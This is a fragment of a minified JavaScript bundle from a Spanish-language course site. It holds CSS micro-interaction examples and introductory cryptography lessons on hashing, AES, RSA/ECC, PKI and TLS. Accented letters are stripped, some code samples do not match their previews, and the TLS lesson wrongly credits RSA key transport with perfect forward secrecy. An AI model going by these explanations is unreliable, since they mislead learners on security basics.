<div style="font-size:4rem; cursor:pointer; transition:0.2s;" onmouseover="this.style.transform='scale(1.2)'" onmouseout="this.style.transform='scale(1)'" onclick="var s = this.style; s.transform='scale(1.5)'; setTimeout(function(){s.transform='scale(1.2)'}, 100)"></div>
</div>
</details>

### Ejemplo 2: Liquid Progress
Cargas que se sienten naturales.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:200px; height:10px; background:#333; border-radius:5px; overflow:hidden;">
    <div style="width:60%; height:100%; background:linear-gradient(to right, #10b981, #6ee7b7); border-radius:5px; animation: wave 2s infinite ease-in-out;"></div>
  </div>
  <style>@keyframes wave { 0% { transform:translateX(-100%); } 100% { transform:translateX(100%); } }</style>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  width:200px;
  height:10px;
  background:#333;
  border-radius:5px;
  overflow:hidden;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Liquid Loader</summary>
<div class="preview-box">
<div style="width:200px; height:10px; background:#333; border-radius:5px; overflow:hidden;">
    <div style="width:60%; height:100%; background:linear-gradient(to right, #10b981, #6ee7b7); border-radius:5px; animation: wave 2s infinite ease-in-out;"></div>
  </div>
  <style>@keyframes wave { 0% { transform:translateX(-100%); } 100% { transform:translateX(100%); } }</style>
</div>
</details>

### Ejemplo 3: Floating Elements
Sensacin de ingravidez en la interfaz.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background:#fff; border-radius:24px; padding:2rem; width:180px; text-align:center; animation: float 3s infinite ease-in-out; box-shadow:0 30px 60px rgba(0,0,0,0.1);">
     <div style="font-size:2rem;"></div>
     <div style="font-family:sans-serif; color:#666; font-size:0.8rem; margin-top:10px;">Light as air.</div>
  </div>
  <style>@keyframes float { 0%, 100% { transform:translateY(0); } 50% { transform:translateY(-20px); } }</style>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#fff;
  border-radius:24px;
  padding:2rem;
  width:180px;
  text-align:center;
  animation: float 3s infinite ease-in-out;
  box-shadow:0 30px 60px rgba(0,0,0,0.1);
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Floating Card</summary>
<div class="preview-box">
<div style="background:#fff; border-radius:24px; padding:2rem; width:180px; text-align:center; animation: float 3s infinite ease-in-out; box-shadow:0 30px 60px rgba(0,0,0,0.1);">
     <div style="font-size:2rem;"></div>
     <div style="font-family:sans-serif; color:#666; font-size:0.8rem; margin-top:10px;">Light as air.</div>
  </div>
  <style>@keyframes float { 0%, 100% { transform:translateY(0); } 50% { transform:translateY(-20px); } }</style>
</div>
</details>

### Ejemplo 4: Celebracin de xito (Success Bloom)
Micro-animacin que recompensa al usuario al completar una tarea.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:100px; height:100px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; transition: 0.2s;" onmouseover="this.style.background='rgba(16,185,129,0.2)'; this.style.borderColor='#10b981'; this.style.transform='translate(5px, 5px)'" onmouseout="this.style.background='rgba(255,255,255,0.05)'; this.style.borderColor='rgba(255,255,255,0.1)'; this.style.transform='translate(0)'">
    <div style="width:10px; height:10px; background:#fff; border-radius:50%;"></div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#111;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Celebration</summary>
<div class="preview-box" style="background:#111;">
  <div style="position:relative; display:flex; align-items:center; justify-content:center;">
    <div style="font-size:3rem; z-index:2;"></div>
    <div style="position:absolute; width:10px; height:20px; background:#facc15; border-radius:50%; animation: burst 1s infinite alternate;"></div>
    <div style="position:absolute; width:10px; height:10px; background:#10b981; border-radius:50%; animation: burst 1.2s infinite alternate-reverse;"></div>
  </div>
  <style>@keyframes burst { from { transform: scale(1) translate(0); opacity:1; } to { transform: scale(3) translate(30px, -40px); opacity:0; } }</style>
</div>
</details>

### Ejemplo 5: Profundidad de Cursor (Magnetic Hover)
Sensacin de que el elemento es atrado fsicamente por el puntero.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  width:100px;
  height:100px;
  background:rgba(255,255,255,0.05);
  border:1px solid rgba(255,255,255,0.1);
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  cursor:pointer;
  transition: 0.2s;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Magnetic Feel</summary>
<div class="preview-box">
<div style="width:100px; height:100px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; transition: 0.2s;" onmouseover="this.style.background='rgba(16,185,129,0.2)'; this.style.borderColor='#10b981'; this.style.transform='translate(5px, 5px)'" onmouseout="this.style.background='rgba(255,255,255,0.05)'; this.style.borderColor='rgba(255,255,255,0.1)'; this.style.transform='translate(0)'">
    <div style="width:10px; height:10px; background:#fff; border-radius:50%;"></div>
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-6-3-coherencia-marca",title:"6.3 Coherencia Marca-UI",level:"senior",content:`# 6.3 Coherencia Marca-UI

La identidad visual en cada pixel.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Logo Integration
Uso inteligente del logo en la interfaz.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; align-items:center; gap:10px; font-family:sans-serif; font-weight:900; color:#fff;">
    <div style="width:30px; height:30px; background:#10b981; clip-path: polygon(50% 0%, 0% 100%, 100% 100%);"></div>
    <span>PROGRAVIO</span>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  display:flex;
  align-items:center;
  gap:10px;
  font-family:sans-serif;
  font-weight:900;
  color:#fff;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Brand Mark</summary>
<div class="preview-box">
<div style="display:flex; align-items:center; gap:10px; font-family:sans-serif; font-weight:900; color:#fff;">
    <div style="width:30px; height:30px; background:#10b981; clip-path: polygon(50% 0%, 0% 100%, 100% 100%);"></div>
    <span>PROGRAVIO</span>
  </div>
</div>
</details>

### Ejemplo 2: Button Personality
Mismo botn, dos almas diferentes para dos marcas diferentes.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; border-radius:12px; overflow:hidden;">
    <div style="width:50px; height:100px; background:#1e1b4b;"></div>
    <div style="width:50px; height:100px; background:#312e81;"></div>
    <div style="width:50px; height:100px; background:#4338ca;"></div>
    <div style="width:50px; height:100px; background:#10b981;"></div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  flex-direction:column;
  gap:20px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Brand Soul</summary>
<div class="preview-box" style="flex-direction:column; gap:20px;">
  <button style="background:#000; color:#fff; padding:15px; width:200px; border:none; font-family:serif; letter-spacing:3px;">MINIMAL LUXURY</button>
  <button style="background:#ff00ea; color:#fff; padding:15px; width:200px; border:none; font-family:sans-serif; font-weight:900; border-radius:20px; box-shadow:0 0 20px #ff00ea;">VIBRANT TECH</button>
</div>
</details>

### Ejemplo 3: Unified Palettes
Colores que cuentan una historia coherente.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  display:flex;
  border-radius:12px;
  overflow:hidden;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Color Story</summary>
<div class="preview-box">
<div style="display:flex; border-radius:12px; overflow:hidden;">
    <div style="width:50px; height:100px; background:#1e1b4b;"></div>
    <div style="width:50px; height:100px; background:#312e81;"></div>
    <div style="width:50px; height:100px; background:#4338ca;"></div>
    <div style="width:50px; height:100px; background:#10b981;"></div>
  </div>
</div>
</details>

### Ejemplo 4: Tono de Voz Tipogrfico
Diseo que "suena" serio vs diseo que "suena" amigable.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; gap:20px;">
    <div style="width:40px; height:40px; border:2px solid #10b981; border-radius:10px; display:flex; align-items:center; justify-content:center; color:#10b981; font-weight:900;">+</div>
    <div style="width:40px; height:40px; border:2px solid #10b981; border-radius:10px; display:flex; align-items:center; justify-content:center; color:#10b981; font-weight:900;"></div>
    <div style="width:40px; height:40px; border:2px solid #10b981; border-radius:10px; display:flex; align-items:center; justify-content:center; color:#10b981; font-weight:900;">=</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  flex-direction:column;
  gap:20px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Brand Voice</summary>
<div class="preview-box" style="flex-direction:column; gap:20px;">
  <div style="font-family:serif; font-size:1.5rem; border-bottom:1px solid #444; color:#fff;">Corporate Authority</div>
  <div style="font-family:cursive, sans-serif; font-size:1.5rem; color:#ff6b6b; font-weight:bold;">Playful Creative</div>
</div>
</details>

### Ejemplo 5: Iconografa con Propsito consistentemente Estilizada
Usar iconos que compartan el mismo peso de lnea y estilo de esquina que la UI.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  display:flex;
  gap:20px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Unified Icons</summary>
<div class="preview-box">
<div style="display:flex; gap:20px;">
    <div style="width:40px; height:40px; border:2px solid #10b981; border-radius:10px; display:flex; align-items:center; justify-content:center; color:#10b981; font-weight:900;">+</div>
    <div style="width:40px; height:40px; border:2px solid #10b981; border-radius:10px; display:flex; align-items:center; justify-content:center; color:#10b981; font-weight:900;"></div>
    <div style="width:40px; height:40px; border:2px solid #10b981; border-radius:10px; display:flex; align-items:center; justify-content:center; color:#10b981; font-weight:900;">=</div>
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-7-proyecto-final",title:"7. Proyecto Final: The Visual Architect",level:"senior",content:`# 7. Proyecto Final: The Visual Architect

Demuestra que dominas el arte de los sistemas visuales.

###  El Desafo
Crea una landing page responsive para un producto tech ficticio.
Aplica todo lo aprendido:
1.  **Jerarqua Visual** clara.
2.  **Sistema de Tokens** (Variables).
3.  **Esttica Definida** (Modern, Neo-brutal, Glass, etc).
4.  **Micro-interacciones** emotivas.

Mucha suerte!
`,completed:!1}]},wV=`# Leccin 1: Introduccin a la Criptografa\r
\r
La suma de toda la seguridad que aplicamos al desarrollo moderno reposa sobre principios criptogrficos. La criptografa es el pegamento que sostiene los pilares de la ciberseguridad.\r
\r
## 1. Los Pilares de la Ciberseguridad (CIA Triad+)\r
\r
*   **Confidencialidad:** Asegurar que el mensaje solo sea legible por su destinatario previsto. Si alguien intercepta el mensaje en medio, ver "basura" ilegible.\r
*   **Integridad:** Garantizar que el mensaje no fue modificado (accidental o intencionalmente) en el camino.\r
*   **Disponibilidad (Availability):** Asegurar que el sistema o los datos sean accesibles para los usuarios legtimos siempre que los necesiten.\r
*   **Autenticacin:** Probar fehacientemente que la persona (o sistema) que enva el mensaje es quien dice ser.\r
*   **No repudio:** Asegurar que, una vez que alguien enva un mensaje, no pueda negar haberlo hecho (como una firma legal en el mundo fsico).\r
\r
## 2. Tipos Fundamentales de Operaciones Criptogrficas\r
\r
1.  **Funciones Hash:** Operaciones criptogrficas de "un solo sentido" (irreversibles). Transforman cualquier volumen de datos en una cadena de tamao fijo. Ideales para verificar integridad y almacenar contraseas.\r
2.  **Criptografa Simtrica (Llave Privada Compartida):** Usas la **misma** llave para cerrar (cifrar) y abrir (descifrar). Es muy veloz, la preferida para transmitir gigabytes de datos.\r
3.  **Criptografa Asimtrica (Llave Pblica/Privada):** Tienes un par de llaves matemticamente conectadas. Lo que cifre una, solo lo descifra la otra. Resuelve cmo enviarle un secreto a un extrao de forma segura por internet.\r
\r
## 3. Cifrado (Encryption) vs Codificacin (Encoding)\r
\r
Cuidado! Una confusin clsica de un ingeniero Junior.\r
\r
*   **Codificacin (ej: Base64):** Traduce datos de un formato a otro para que un sistema los pueda transportar (ej. enviar binario a travs de texto en un JSON). **NO da seguridad.** Cualquier persona en el mundo puede decodificar "Hola" en Base64.\r
*   **Cifrado (ej: AES):** Oculta activamente el contenido y la intencin usando una **Llave Secreta**. Solo el poseedor de la llave puede revertir el proceso.\r
\r
---\r
\r
### Misin Junior:\r
Intenta investigar por qu Base64 aumenta el tamao del archivo subyacente alrededor de un 33%. Qu ventajas tiene codificar una imagen a Base64 y guardarla directamente en tu base de datos (o componente de React)?\r
`,jV=`# Leccin 2: Hashing y Salting\r
\r
Un problema clsico: Cmo almacenamos la contrasea de un usuario en nuestra base de datos sin que incluso nosotros mismos (o un hacker si robara la DB) podamos conocerla? La respuesta: **Funciones Hash**.\r
\r
## 1. Caractersticas de una Funcin Hash Criptogrfica\r
\r
Una funcin Hash toma una entrada de cualquier tamao y produce un resultado (hash o digest) de *tamao fijo* (ej: 256 bits). Para ser "criptogrficamente segura", debe cumplir:\r
\r
*   **Determinista:** El mismo mensaje siempre, sin excepcin, produce el mismo hash.\r
*   **Irreversible (One-Way):** Es matemticamente inviable, con los recursos computacionales actuales o futuros cercanos, descubrir el mensaje original a partir de su hash.\r
*   **Efecto Avalancha:** Si cambias un solo bit del mensaje original (una coma, una mayscula), el hash resultante cambia por completo y de forma impredecible.\r
*   **Resistencia a Colisiones:** Debe ser increblemente difcil encontrar dos mensajes distintos que produzcan exactamente el mismo hash.\r
\r
> Algoritmos conocidos: \`SHA-256\`, \`SHA-3\`, \`bcrypt\`, \`Argon2\`. (Tip: No uses \`MD5\` ni \`SHA-1\` para contraseas, estn "rotos").\r
\r
## 2. El Peligro de las Rainbow Tables\r
\r
Si guardamos el hash de una contrasea comn (como "123456"), cualquier hacker puede precalcular el hash de las 10 millones de contraseas ms populares y simplemente buscar coincidencias en nuestra base de datos vulnerada. Eso es una "Rainbow Table".\r
\r
## 3. La Solucin: Salting (La Pizca de Sal)\r
\r
El **Salt** es una cadena de texto aleatoria que se genera especficamente para *cada* usuario al momento de crear su contrasea.\r
\r
1.  El usuario ingresa "123456".\r
2.  El sistema genera un Salt: "XyZ9$".\r
3.  El sistema hashea la combinacin: \`Hash("123456" + "XyZ9$") -> 8a4b...\`\r
4.  En la DB guardamos *tanto el Hash como el Salt*.\r
\r
**Cmo nos protege?** Un hacker tendra que crear una Rainbow Table *diferente* para cada usuario individual de nuestra base de datos, porque cada uno tiene un Salt nico. Esto hace que el ataque masivo sea inviable en tiempo y almacenamiento.\r
\r
---\r
\r
### Misin Junior:\r
Investiga la diferencia tcnica entre \`SHA-256\` y \`bcrypt\`. Solo hay un escenario correcto donde debes elegir bcrypt y solo bcrypt como ingeniero backend. Cul es y por qu SHA-256 "falla" aqu?\r
`,DV=`# Leccin 3: Criptografa Simtrica (La Llave nica)\r
\r
Es la criptografa ms antigua (Julio Csar la usaba) y, computacionalmente, la ms rpida que existe. Se llama "Simtrica" porque la accin (cifrar y descifrar) es un reflejo la una de la otra, usando un nico secreto: **La misma llave.**\r
\r
## 1. Cmo funciona?\r
\r
Imagina una caja fuerte con un candado que requiere una llave metlica especfica para cerrarse. Exactamente esa misma llave metlica es la que se requiere para abrirla. Ese es todo el concepto.\r
\r
## 2. Estndares Modernos: AES (Advanced Encryption Standard)\r
\r
El algoritmo simtrico ms extendido e inquebrantable hoy en da se llama AES (Rijndael).\r
*   **Tamao de llave:** 128, 192 o 256 bits. (Se considera seguro frente a ataques cunticos futuros a 256 bits).\r
*   **Funcionamiento (Bloques):** Divide tu archivo gigantesco (ej. una pelcula de 2GB) en bloques de 16 bytes y procesa el cifrado bloque por bloque usando rondas matemticas complejas (SubBytes, ShiftRows, MixColumns).\r
*   **Rendimiento:** Extremadamente rpido. Los procesadores modernos (Intel/AMD/ARM) tienen instrucciones de hardware dedicadas (AES-NI) para cifrar/descifrar. Es en lo que confiamos para cifrar discos duros enteros.\r
\r
## 3. Modos de Operacin (Evitando Patrones)\r
\r
Nunca uses el modo ECB (Electronic Codebook). Si tienes una imagen del Pato Donald y la cifras con AES-ECB (el bloque A siempre dar el criptograma X), podrs ver la silueta del pjaro en la esttica resultante!\r
\r
**Los Ingenieros usan GCM (Galois/Counter Mode) o CBC (Cipher Block Chaining).**\r
Estos modos utilizan un **IV (Vector de Inicializacin)**, que es un nmero aleatorio usado solo una vez por cada mensaje, asegurando que si cifras "Hola" dos veces con tu llave, el texto resultante sea completamente distinto en ambas ocasiones. *(Nota: El IV no es secreto, se guarda/enva junto al texto cifrado).*\r
\r
## 4. El Taln de Aquiles Simtrico: "El Problema de Distribucin"\r
\r
Si la llave simtrica resuelve todo rpido... Por qu hay otras soluciones?\r
\r
**El Escenario:** Quieres comprar algo en Amazon de forma segura y debes enviarle tu nmero de tarjeta usando AES. Para que Amazon pueda descifrarlo.. **debes enviarle tu Llave AES**.\r
Pero... enviar la llave por internet es inseguro (alguien puede interceptarla y listo, se apoder de tus compras).\r
\r
Cmo compartes una llave secreta de forma segura la primera vez con alguien en la otra punta del planeta? Solo la criptografa Asimtrica puede salvarte.\r
\r
---\r
\r
### Misin Semi-Senior:\r
Estudia el **Ataque MITM (Man-In-The-Middle)** centrado solo en el problema de distribucin de llaves compartidas. Qu podra hacer tu compaa para mitigar este ataque sin internet asimtrico?\r
`,MV=`# Leccin 4: Criptografa Asimtrica (Par de Llaves)\r
\r
Para resolver el problema de cmo compartir una llave secreta a travs del aire (o internet) sin que los espas puedan usarla, la matemtica invent la "Magia" asimtrica en la dcada de los 70 (Diffie-Hellman y RSA).\r
\r
## 1. El Concepto Fundamental: El Par Entrelazado\r
\r
En criptografa asimtrica no tienes *una* llave. Tienes dos que se generan juntas (son un par indisoluble y estn matemticamente conectadas).\r
\r
1.  **Llave Pblica:** Es literalmente pblica. La gritas a los cuatro vientos, la pones en tu bio de Twitter, la publicas en la portada del peridico.\r
2.  **Llave Privada:** Tu secreto mejor guardado en el mundo digital. Es el equivalente a tu pasaporte. Solo existe en tu hardware (como en un telfono o una YubiKey).\r
\r
> **La Regla de Oro Matmatica:** Lo que una llave *cifra*, nica y exclusivamente la otra llave del par puede *descifrar*. Si algo se cifra con la Pblica, el hacker **no puede** usar la Pblica para revertirlo.\r
\r
## 2. Escenario 1: Confidencialidad y Mensajes Seguros\r
\r
**El problema a resolver:** Alice quiere enviarle un secreto a Bob.\r
**La solucin:**\r
1.  Bob publica su **Llave Pblica**.\r
2.  Alice descarga la Pblica de Bob.\r
3.  Alice cifra su mensaje usando la Pblica de Bob.\r
4.  Alice enva esto por el internet inseguro. **Cualquier atacante (Eve) que intercepte esto y tenga la Pblica de Bob... fracasar miserablemente al intentar revertirlo. Se necesita la contraparte.**\r
5.  Solo Bob, con su preciada **Llave Privada** (que jams abandon su computadora), puede usarla para desencriptar y leer a Alice.\r
\r
## 3. Los Estndares: RSA y ECC\r
\r
*   **RSA (Rivest-Shamir-Adleman):** El clsico. Basado en el problema matemtico de **factorizar nmeros primos gigantescos** (dos primos de centenares de dgitos se multiplican). Crear la pblica es multiplicar, encontrar la privada requerira computar divisiones por 100 aos a las supercomputadoras. Sus llaves son gigantes (2048 o 4096 bits) por ser poco eficientes en clculo.\r
*   **ECC (Elliptic-Curve Cryptography):** El futuro y el presente. Basado en saltos algortmicos en grficas de curvas continuas. Con una llave pequeita de 256 bits, logra la misma seguridad inquebrantable que un mastodonte RSA de 3072 bits. Fundamental para dispositivos mviles y blockchain (Bitcoin/Ethereum).\r
\r
## 4. El Costo Asimtrico\r
\r
Nada es gratis. Su debilidad garrafal radica en su **complejidad computacional**. Es tan pesada su matemtica asimtrica que cifrar gigabytes de fotos usando RSA tardara horas o das, destrozando el rendimiento del hardware y la batera de un dispositivo.\r
\r
Es por esto que, en Ciberseguridad Moderna, rara vez se usa para comunicaciones directas... se usa inteligentemente en conjunto con la Simtrica (Leccin 6).\r
\r
---\r
\r
### Misin Semi-Senior:\r
Investiga el protocolo Diffie-Hellman Key Exchange (DHKE). Imagina la analoga mezclando varios baldes de polvo de colores (privado vs pblico) para terminar obteniendo ambos el mismo color secreto exacto, y por qu el espa en medio termina frustrado.\r
`,NV=`# Leccin 5: Firmas Digitales y PKI (Infraestructura de Clave Pblica)\r
\r
Ya vimos cmo asegurar la Confidencialidad enviando un secreto usando la Pblica del destinatario. Pero, Cmo probamos la **Autenticidad y el No Repudio**? (Saber quin firma un documento PDF de verdad, sin falsificaciones).\r
\r
Usaremos la misma pareja de Matemtica Asimtrica... pero al revs.\r
\r
## 1. La Firma Digital: Garantizando la Autora\r
\r
Piensa esto despacio: Si CUALQUIER PERSONA puede usar tu Pblica para descifrar un mensaje... y resulta que el mensaje se lee perfectamente como "Hola Mundo"... Quin es la NICA PERSONA o Computadora en la tierra que pudo *cifrarlo* inicialmente?\r
\r
Exacto: **Solamente el que tenga la Llave Privada correspondiente.**\r
\r
As funcionan las firmas digitales (Certificar que algo es tuyo y no fue alterado):\r
\r
1.  Escribes un contrato PDF gigantesco.\r
2.  Pasas el archivo por una **Funcin Hash** (Leccin 2) (ej. un algoritmo tipo SHA-256) y obtienes un "Digest" diminuto.\r
3.  **CIFRAS ese diminuto Digest usando tu divina LLAVE PRIVADA**. Esto se adjunta al final del PDF. Es todo lo que es una firma digital.\r
\r
## 2. La Verificacin (El Lado de quien Lee)\r
\r
T envas el PDF y la *"Firma Digital"* por internet a un banco.\r
\r
1.  El Banco toma el PDF en claro y lo hashea con SHA-256 por su cuenta, obteniendo su propio Digest.\r
2.  El Banco toma la "Firma Digital" que le enviaste, la cual fue cifrada con tu **Privada**.\r
3.  El Banco usa tu **Llave Pblica** (disponible para todo el mundo) para **DESCIFRAR** esa "Firma Digital".\r
4.  El Banco compara ambos Digests resultantes. Si coinciden 100%, el banco sabe matemticamente dos cosas innegables:\r
    *   **Integridad:** El PDF no fue alterado ni en una coma, porque los hashes coinciden.\r
    *   **Autenticacin / No Repudio:** El *nico medio tecnolgico existente en el planeta* para crear algo que tu llave pblica descifre adecuadamente fue tu Llave Privada. No puedes negar ante un juez que t subiste ese archivo.\r
\r
## 3. El Problema de la Confianza Inicial (PKI)\r
\r
Hay un hueco en toda esta maravilla matemtica Asimtrica.\r
Si te conectas y descargas mi *Llave Pblica*... Cmo diablos sabes con seguridad absoluta que *ESA llave pblica verdaderamente pertenece al servidor de Progravio y no a un hacker ruso fingiendo ser Progravio*?\r
\r
Si usas la Pblica del ruso para comunicarte con l pensando que eres t, caers en la trampa.\r
\r
Para solucionar el problema de la confianza de identidades inventamos la **PKI (Public Key Infrastructure).**\r
\r
## 4. Autoridades de Certificacin (CAs)\r
\r
La PKI introduce "Notarios Digitales" de inmensa confianza matemtica. Organizaciones colosales globales llamadas **CA (Certificate Authorities)**. Ejemplos: DigiCert, Let's Encrypt o Cloudflare.\r
\r
Las CAs firman digitalmente ("con su poderossima llave privada propia de la que todo el mundo se fa y viene preinstalada de fbrica en la computadora/celular/navegador de todo el planeta"), **tu** modesta dupla de llaves, certificando y diciendo: *"Atestiguamos que estas llaves s pertenecen al servidor Progravio.com"*.\r
A este documento avalado matemticamente por una CA se le llama **Certificado Digital**.\r
\r
---\r
\r
### Misin Senior:\r
Tu computadora tiene un lugar que almacena los \`Root Certificates\` de las CAs principales (El almacn de Confianza de Windows/Mac). Qu catstrofe mundial ocurre si un atacante roba secretamente una "Llave Privada Root" de una CA gigante como DigiCert durante unos meses?\r
`,_V=`# Leccin 6: TLS y HTTPS (Simtrica + Asimtrica)\r
\r
Ya estudiamos Simtrica (O(1) pero intil para conocerse por primera vez) y Asimtrica (Magia Pura pero O(n) de lentitud).\r
\r
**En el mundo real, los navegadores (Chrome), WhatsApp o los Bancos combinan ambas (Sistema Hbrido) en algo llamado TLS (Transport Layer Security) - y HTTPs es simplemente HTTP por sobre TLS.**\r
\r
## 1. El famoso Handshake TLS (Apretn de Manos)\r
\r
Cuando t (Cliente) abres \`https://progravio.com\` (Servidor), ocurre una charla secreta milisegundos antes de cargar el CSS y HTML.\r
\r
1.  **"Hello, Progravio":** Tu navegador saluda y le dice qu cifrados criptogrficos sabe hablar.\r
2.  **"Hello, Cliente":** El Servidor responde eligiendo el mejor algoritmo y te enva algo fundamental: **Su Certificado Digital PKI (que contiene su Llave Pblica RSA/ECC)**.\r
3.  **Verificacin CA:** Tu navegador revisa contra su tienda Root de Windows/Mac si ese certificado fue firmado por una CA real (DigiCert) y no ha expirado. (Si algo falla, sale la temida pantalla roja de Chrome: *"Tu conexin no es privada"*).\r
4.  **La Magia Asimtrica en accin (El Secreto Compartido):** Aqu es donde convergen ambos mundos. Si todo est correcto, el Cliente genera un Nmero Totalmente Aleatorio llamado \`Pre-Master Secret\`. Lo *CIFRA* con la maravillosa LLAVE PBLICA que el servidor acaba de mandar. Se le enva al Servidor.\r
5.  **Solo Progravio lee:** Ese paquete asimtrico vuela por el aire, un ruso lo roba. Fracasa al abrirlo porque solo la LLAVE PRIVADA original oculta bajo 10 llaves en AWS del Servidor puede revertirlo. El servidor lo recibe, lo desencripta y obtiene el \`Pre-Master Secret\` limpio.\r
\r
## 2. El Paso Final: La Llave de Sesin (Simtrica)\r
\r
Ambas partes lograron un imposible: **Acordar, a travs de un canal inseguro, un Gigantesco Secreto nico.**\r
Ahora, usando magia matemtica a partir de ese pre-master secret, tanto el Servidor como el Navegador generan una **LLAVE SIMTRICA DE SESIN IDNTICA (AES-256)!**\r
\r
*   Adis Asimtrica lenta y pesada! (Se descarta, ya cumpli su vital rol de emparejador).\r
*   Hola Simtrica a la velocidad de la luz!\r
\r
A partir de este instante, TODO el trfico de ida y de vuelta (tus contraseas de banco, las pelculas de Netflix, la foto real enviada) se encripta con AES usando esa llave ultra rpida de Sesin. Absolutamente nadie en el planeta puede abrir esos paquetes de la vida real sin esa nueva llave temporal.\r
\r
Cuando cierras la pestaa o te desconectas... **la llave muere para siempre**. Si entras maana, habr un Handshake totalmente nuevo y una llave de Sesin AES fresca. A esto se le llama **Perfect Forward Secrecy** (Si un hacker roba la llave Privada Asimtrica hoy... los terabytes de comunicacin antigua que intercept durante un mes *tampoco* podrn ser desencriptados porque cada sesin generaba su magia efmera independiente).\r
\r
---\r
\r
### Misin Senior:\r
Muestra lo que sabes: Explcale a un Junior por qu TLS 1.3 es ridculamente superior y ms seguro computacionalmente que el antiguo TLS 1.0 y 1.1, enfocndote exclusivamente en el nmero de viajes Round-Trip del handshake TLS y Perfect Forward Secrecy por defecto.\r
`,D1={id:"criptografia",title:"Criptografa y Seguridad Aplicada",description:"Comprende cmo los algoritmos matemticos protegen la informacin del mundo real. Desde hashes hasta el handshake TLS que asegura la web.",completed:!1,track:"Especializacin",lessons:[{id:"cripto-01-intro",title:"Introduccin a la Criptografa",level:"junior",content:wV,completed:!1},{id:"cripto-02-hashing",title:"Hashing y Salting",level:"junior",content:jV,completed:!1},{id:"cripto-03-simetrica",title:"Criptografa Simtrica",level:"semi-senior",content:DV,completed:!1},{id:"cripto-04-asimetrica",title:"Criptografa Asimtrica",level:"semi-senior",content:MV,completed:!1},{id:"cripto-05-firmas",title:"Firmas Digitales y PKI",level:"senior",content:NV,completed:!1},{id:"cripto-06-tls",title:"TLS y HTTPS (Simtrica + Asimtrica)",level:"senior",content:_V,completed:!1}]},M1=[aD,tD,nD,c1,iD,u1,oD,sD,d1,p1,m1,rD,lD,cD,f1,h1,g1,b1,v1,y1,uD,E1,S1,dD,C1,T1,pD,x1,A1,P1,mD,fD,L1,R1,hD,I1,gD,w1,bD,j1,D1],Td=a=>M1.find(e=>e.id===a),cP=()=>{const[a,e]=U.useState(""),[t,n]=U.useState(!1),i=rr(),r=U.useRef(null),l=U.useMemo(()=>{if(a.length<2)return[];const d=[];return M1.forEach(p=>{p.title.toLowerCase().includes(a.toLowerCase())?p.lessons.forEach(f=>{d.push({moduleId:p.id,lessonId:f.id,title:f.title,moduleTitle:p.title.split(":")[0]})}):p.lessons.forEach(f=>{f.title.toLowerCase().includes(a.toLowerCase())&&d.push({moduleId:p.id,lessonId:f.id,title:f.title,moduleTitle:p.title.split(":")[0]})})}),d.slice(0,8)},[a]);U.useEffect(()=>{const d=p=>{r.current&&!r.current.contains(p.target)&&n(!1)};return document.addEventListener("mousedown",d),()=>document.removeEventListener("mousedown",d)},[]);const u=(d,p)=>{e(""),n(!1),i(`/learn/${d}?lesson=${p}`)};return b.jsxs("div",{className:"search-bar-container",ref:r,children:[b.jsx("input",{type:"text",className:"search-input",placeholder:"Buscar lecciones o temas...",value:a,onChange:d=>{e(d.target.value),n(!0)},onFocus:()=>n(!0)}),t&&l.length>0&&b.jsx("ul",{className:"search-results",children:l.map((d,p)=>b.jsxs("li",{className:"search-result-item",onClick:()=>u(d.moduleId,d.lessonId),children:[b.jsx("span",{className:"result-title",children:d.title}),b.jsx("span",{className:"result-module",children:d.moduleTitle})]},`${d.moduleId}-${d.lessonId}-${p}`))})]})};const vD=(...a)=>a.filter((e,t,n)=>!!e&&e.trim()!==""&&n.indexOf(e)===t).join(" ").trim();const qV=a=>a.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase();const kV=a=>a.replace(/^([A-Z])|[\s-_]+(\w)/g,(e,t,n)=>n?n.toUpperCase():t.toLowerCase());const uP=a=>{const 